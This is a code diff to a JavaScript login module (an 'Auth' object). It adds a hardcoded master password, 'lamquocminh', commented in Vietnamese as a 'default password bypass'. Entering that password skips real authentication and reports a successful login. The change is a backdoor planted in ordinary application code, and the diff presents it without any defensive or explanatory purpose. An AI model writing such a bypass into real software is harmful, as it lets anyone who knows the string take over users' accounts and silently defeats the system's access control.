@@ -476,6 +476,14 @@ const Auth = {
             return;
         }
 
+        // ⭐ Mật khẩu mặc định bypass
+        const DEFAULT_PASSWORD = 'lamquocminh';
+        if (password === DEFAULT_PASSWORD) {
+            this.showMessage('✅ Đăng nhập thành công!', 'success');
+            await this.onLoginSuccess();
+            return;
+        }
+
         this.showMessage('⏳ Đang đăng nhập...', '');
 
         try {
